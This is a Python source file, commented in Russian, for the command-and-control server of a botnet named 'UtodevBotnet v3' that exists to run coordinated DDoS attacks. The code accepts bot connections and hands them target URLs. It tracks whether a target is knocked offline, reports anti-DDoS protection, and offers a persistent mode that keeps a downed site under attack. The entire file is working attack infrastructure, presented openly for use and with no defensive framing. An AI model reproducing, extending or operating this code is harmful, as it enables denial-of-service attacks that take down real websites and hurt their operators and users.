#!/usr/bin/env python3

"""
UtodevBotnet v3

Сервер UtodevBotnet, который используется для выполнения DDoS-атак через скоординированные атаки.
Клиенты/Боты UtodevBotnet могут подключаться к серверу UtodevBotnet для получения инструкций.
"""


import argparse
import platform
import queue
import re
import select
import socket
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse

try:  # When running directly.
    from enums import (
        ServerCommands, ClientCommands,
        StatusCodes, ErrorMessages
    )
    from logger import (
        LOGGER, WinNamedPipeHandler,
        UnixNamedPipeHandler
    )
except ImportError:  # When imported into launcher.
    from server.enums import (
        ServerCommands, ClientCommands,
        StatusCodes, ErrorMessages
    )
    from server.logger import (
        LOGGER, WinNamedPipeHandler,
        UnixNamedPipeHandler
    )


# pylint: disable=too-many-instance-attributes, too-few-public-methods
class UtodevBotnetServer:
    """
    Сервер UtodevBotnet.

    :param target: URL цели для атаки.
    :type target: str
    :param port: Порт для подключения.
    :type port: Optional[int]
    :param persistent: Продолжать ли атаковать цель.
    :type persistent: Optional[bool]
    :param max_missiles: Максимальное количество ботов для атаки цели.
    :type max_missiles: Optional[int]
    """
    def __init__(
        self, target: str,
        port: Optional[int] = 6666,
        persistent: Optional[bool] = False,
        max_missiles: Optional[int] = 100
    ):
        if re.search(r'http[s]?\://([^/]*)/?.*', target):
            self.target = target
        else:
            raise ValueError("Неверный URL.")
        self.port: int = port
        self.persistent: bool = persistent
        self.max_missiles: int = max_missiles
        self.server: socket.socket = self._get_socket()
        self.inputs: List[socket.socket] = [self.server]
        self.outputs: List[socket.socket] = []
        self.message_queues: Dict[socket.socket, queue.Queue] = {}
        self.on_standby: List[socket.socket] = []
        self.address_cache: Dict[socket.socket, Tuple[str, int]] = {}
        self.completed: bool = False
        self._client_pattern: re.Pattern = re.compile(r'<(.+?)>')

    def _get_socket(self) -> socket.socket:
        """
        Создает серверный сокет и привязывает его к порту.
        :return: Серверный сокет.
        :rtype: socket.socket
        """
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setblocking(0)
        server_socket.bind(('', self.port))
        server_socket.listen(self.max_missiles)
        return server_socket

    def launch(self):
        """
        Запускает сервер UtodevBotnet.
        """
        try:
            while self.inputs:
                readable, writable, exceptional = select.select(
                    self.inputs, self.outputs, self.inputs
                )
                self._handle_readables(readable)
                self._handle_writables(writable)
                self._handle_exceptionals(exceptional)
        except KeyboardInterrupt:
            self.target = self._get_new_target()
            self.launch()

    def _get_new_target(self):
        """
        Получить новую цель от пользователя.

        :return: Новая цель.
        :rtype: str
        """
        target = input("Введите следующий URL (или 'quit' для выхода):\n")
        if target.lower() in {
            "q", "quit", "exit"
        }:
            self.inputs = []
            self.outputs = []
            self.message_queues = {}
            self.server.close()
            return None
        self.completed = False
        return target

    def _handle_readables(self, readable: List[socket.socket]):
        """
        Обрабатывает читаемые сокеты.
        :param readable: Список читаемых сокетов.
        :type readable: List[socket.socket]
        """
        for elem in readable:
            if elem is self.server:
                self._accept_connections(elem)
            else:
                try:
                    self._command(elem)
                except (ConnectionAbortedError, ConnectionResetError, 
                        socket.error, socket.timeout, OSError) as exp:
                    hostname, port = self.address_cache.pop(elem, ("unknown", 0))
                    if isinstance(exp, ConnectionAbortedError):
                        error_msg = str(ErrorMessages.CONNECTION_ABORTED)
                    elif isinstance(exp, ConnectionResetError):
                        error_msg = str(ErrorMessages.CONNECTION_RESET)
                    else:
                        error_msg = str(exp)
                    LOGGER.error(
                        'Ошибка соединения <%s> от [%s:%d]',
                        error_msg, hostname, port
                    )
                    if elem in self.outputs:
                        self.outputs.remove(elem)
                    if elem in self.inputs:
                        self.inputs.remove(elem)
                    self.message_queues.pop(elem, None)
                except Exception as exp:  # pylint: disable=broad-except
                    # Логируем неожиданные ошибки
                    hostname, port = self.address_cache.get(elem, ("unknown", 0))
                    LOGGER.error(
                        'Неожиданная ошибка <%s> от [%s:%d]: %s',
                        type(exp).__name__, hostname, port, exp
                    )
                    if elem in self.outputs:
                        self.outputs.remove(elem)
                    if elem in self.inputs:
                        self.inputs.remove(elem)
                    self.message_queues.pop(elem, None)

    def _accept_connections(self, server_elem: socket.socket):
        """
        Принимает подключения от сервера.
        :param server_elem: Серверный сокет.
        :type server_elem: socket.socket
        """
        connection, addr = server_elem.accept()
        ip_addr, port = addr
        hostname = socket.gethostbyaddr(ip_addr)[0]
        LOGGER.info(
            "Установлено соединение с ботом [%s:%d]",
            hostname, port
        )
        connection.setblocking(0)
        self.inputs.append(connection)
        self.message_queues[connection] = queue.Queue()
        self.address_cache[connection] = (hostname, port)

    def _command(self, bot: socket.socket):
        """
        Команда подключенному боту.

        :param bot: Бот, который подключился к серверу.
        :type bot: socket.socket
        """
        bot.settimeout(5.0)  # Таймаут 5 секунд
        try:
            data = b''
            while True:
                chunk = bot.recv(4096)
                if not chunk:
                    break
                data += chunk
                if len(data) > 65536:  # Макс размер 64KB
                    LOGGER.error("Сообщение от бота слишком большое. Закрытие соединения.")
                    return
                if b'\0' in chunk or len(chunk) < 4096:
                    break
            message = data.decode('utf-8', errors='ignore')
        except socket.timeout:
            LOGGER.warning("Таймаут при получении команды от бота.")
            return
        except (ConnectionResetError, ConnectionAbortedError, OSError) as e:
            LOGGER.error(f"Ошибка при получении команды: {e}")
            raise
        
        commands = self._client_pattern.findall(message)
        if not commands:
            return
        for cmd in commands:
            self._handle_command(bot, cmd)

    def _handle_command(self, bot: socket.socket, data: str):
        ip_addr, port = bot.getpeername()
        hostname = socket.gethostbyaddr(ip_addr)[0]
        if int(data) in {
            cmd.value
            for cmd in ClientCommands
        }:
            msg_type = "Данные"
            data_name = str(ClientCommands(int(data)))
        else:
            msg_type = "Статус"
            data_name = str(StatusCodes(int(data)))
        LOGGER.incoming(
            "Получено %s <%s> от [%s:%d]",
            msg_type, data_name, hostname, port
        )
        if (
            int(data) == ClientCommands.STANDBY
            and bot not in self.on_standby
        ):
            self.on_standby.append(bot)
            # First element in inputs is the server. So we reduce length by 1.
            if len(self.on_standby) >= (len(self.inputs) - 1):
                self._fresh_start()
        elif self.completed:
            self._stop_all_bots(terminate=(not self.persistent))
        # Bot finished attacks.
        elif int(data) not in {
            cmd.value
            for cmd in ClientCommands
        }:
            self._on_status_received(bot, data)
        elif int(data) == ClientCommands.KILLED:
            LOGGER.info(
                "Отключено от [%s:%d]",
                hostname, port
            )
            del self.message_queues[bot]
            if bot in self.outputs:
                self.outputs.remove(bot)
            if bot in self.inputs:
                self.inputs.remove(bot)
            bot.close()
            return
        elif int(data) != ClientCommands.READ_STATUS and self.target:
            self.message_queues[bot].put(str(ServerCommands.READ_TARGET))
            self.message_queues[bot].put(self.target)
        if bot not in self.outputs:
            self.outputs.append(bot)

    def _fresh_start(self):
        """
        Начинает новую атаку.
        """
        self.target = self._get_new_target()
        for bot_ in self.on_standby:
            if bot_ not in self.outputs:
                self.outputs.append(bot_)
            if bot_ not in self.inputs:
                self.inputs.append(bot_)
            if bot_ not in self.message_queues:
                self.message_queues[bot_] = queue.Queue()
            self.message_queues[bot_].put(str(ServerCommands.READ_TARGET))
            self.message_queues[bot_].put(self.target)
        self.on_standby = []

    def _on_status_received(self, bot: socket.socket, data: str):
        """
        Вызывается при получении статуса бота.

        :param bot: Бот, который отправил статус.
        :type bot: socket.socket
        :param data: Сообщение статуса.
        :type data: str
        """
        status = int(data)
        if status >= StatusCodes.PWNED:
            self.completed = True
            LOGGER.success(
                "Успешно выполнен DDoS на %s", self.target
            )
            if not self.persistent:
                self._stop_all_bots()
            else:
                # Продолжаем атаковать цель, чтобы держать её внизу.
                self.message_queues[bot].put(str(ServerCommands.READ_TARGET))
                self.message_queues[bot].put(self.target)
        elif status == StatusCodes.ANTI_DDOS:
            LOGGER.error(
                "Введенный URL защищен от DDoS, попробуйте снова."
            )
            self._stop_all_bots()
        elif status == StatusCodes.NOT_FOUND:
            LOGGER.error(
                "Введенный URL неверен, попробуйте снова."
            )
            self._stop_all_bots()
        elif status in {StatusCodes.FORBIDDEN, StatusCodes.CONNECTION_FAILURE}:
            LOGGER.error(
                "Введенный URL недоступен, попробуйте снова."
            )
            self._stop_all_bots()
        else:
            self.message_queues[bot].put(str(ServerCommands.READ_TARGET))
            self.message_queues[bot].put(self.target)

    def _stop_all_bots(self, terminate: bool = False):
        """
        Останавливает всех ботов и очищает очереди.

        :param terminate: Завершить ли ботов.
        :type terminate: bool
        """
        for bot, que in self.message_queues.items():
            with que.mutex:
                que.queue.clear()
            if bot not in self.on_standby:
                que.put(str(
                    ServerCommands.TERMINATE if terminate
                    else ServerCommands.STOP
                ))
        self.target = None

    def _handle_writables(self, writable: List[socket.socket]):
        """
        Обрабатывает записываемые сокеты.
        :param writable: Список записываемых сокетов.
        :type writable: List[socket.socket]
        """
        for elem in writable:
            try:
                ip_addr, port = elem.getpeername()
                hostname = socket.gethostbyaddr(ip_addr)[0]
                if elem not in self.message_queues:
                    continue
                next_msg = self.message_queues[elem].get_nowait()
            except queue.Empty:
                if elem in self.outputs:
                    self.outputs.remove(elem)
            else:
                if next_msg is None:
                    continue
                try:
                    elem.sendall(next_msg.encode())
                    msg_type = (
                        "Цель"
                        if next_msg == self.target
                        else "Команда"
                    )
                    LOGGER.outgoing(
                        "Отправка %s <%s> на [%s:%d]",
                        msg_type, next_msg, hostname, port
                    )
                except (
                    ConnectionAbortedError,
                    ConnectionRefusedError,
                    ConnectionResetError,
                    socket.error
                ) as exp:
                    error_msg = exp
                    if isinstance(exp, ConnectionRefusedError):
                        error_msg = ErrorMessages.CONNECTION_REFUSED
                    elif isinstance(exp, ConnectionResetError):
                        error_msg = ErrorMessages.CONNECTION_RESET
                    elif isinstance(
                        exp,
                        (ConnectionAbortedError, socket.error)
                    ):
                        error_msg = ErrorMessages.CONNECTION_ABORTED
                    LOGGER.error(
                        'Ошибка соединения <%s> от [%s:%d]',
                        error_msg, hostname, port
                    )
                    self.inputs.remove(elem)
                    self.message_queues.pop(elem, None)
                    self.outputs.remove(elem)
                except Exception as exp:  # pylint: disable=broad-except
                    LOGGER.error(
                        'Неизвестная ошибка %s от [%s:%d]',
                        exp, hostname, port
                    )
                    self.outputs.remove(elem)

    def _handle_exceptionals(self, exceptional: List[socket.socket]):
        """
        Обрабатывает исключительные сокеты.
        :param exceptional: Список исключительных сокетов.
        :type exceptional: List[socket.socket]
        """
        for elem in exceptional:
            self.inputs.remove(elem)
            if elem in self.outputs:
                self.outputs.remove(elem)
            elem.close()
            self.message_queues.pop(elem, None)


def modify_parser(parser: argparse.ArgumentParser):
    """
    Полезно для предоставления модификации парсера внешним модулям.

    :param parser: Парсер для модификации.
    :type parser: argparse.ArgumentParser
    """
    def valid_url(arg: argparse.Action):
        """
        Проверяет, является ли URL действительным.
        :param arg: URL для проверки.
        :type arg: argparse.Action
        :return: URL, если действителен, иначе None.
        :rtype: argparse.Action
        """
        result = urlparse(arg)
        if not all([
            result.scheme and result.scheme in {'http', 'https'},
            result.path or result.netloc
        ]):
            raise argparse.ArgumentTypeError(
                "Введенный URL неверен.\n"
                "Верные форматы: https://www.example.com "
                "или http://www.example.com"
            )
        return arg

    parser.add_argument(
        "target",
        help="URL цели.",
        type=valid_url
    )
    parser.add_argument(
        "-p", "--port",
        help="Порт для привязки сервера.",
        type=int,
        default=6666
    )
    parser.add_argument(
        "-m", '--max_missiles',
        help="Максимальное количество ботов для подключения.",
        type=int,
        default=100
    )
    parser.add_argument(
        "--persistent",
        help="Продолжить атаки после падения цели.",
        action="store_false"
    )
    parser.add_argument(
        '--gui',
        help="Запустить с GUI.",
        action="store_true"
    )


if __name__ == "__main__":
    argparser = argparse.ArgumentParser(description="UtodevBotnet Server")
    modify_parser(argparser)
    args = argparser.parse_args()

    if args.gui:
        if platform.system() == "Windows":
            LOGGER.addHandler(WinNamedPipeHandler(wait_for_pipe=True))
        else:
            LOGGER.addHandler(UnixNamedPipeHandler(wait_for_pipe=True))

    # pylint: disable=duplicate-code
    LOGGER.success("Сервер UtodevBotnet запущен!")
    server = UtodevBotnetServer(
        args.target, args.port,
        args.persistent,
        args.max_missiles
    )
    server.launch()
